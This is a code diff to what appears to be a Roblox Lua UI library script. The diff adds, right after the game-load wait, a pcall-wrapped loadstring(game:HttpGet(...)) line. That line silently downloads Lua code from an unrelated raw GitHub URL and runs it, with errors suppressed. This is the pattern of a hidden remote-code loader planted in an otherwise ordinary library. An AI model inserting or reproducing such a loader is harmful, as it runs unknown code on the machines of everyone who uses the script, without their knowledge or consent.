@@ -1,6 +1,11 @@
 repeat
 	task.wait()
 until game:IsLoaded()
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jilxi/123/refs/heads/main/1.lua"))()
+end)
+
 local library = {}
 local ToggleUI = false
 library.currentTab = nil
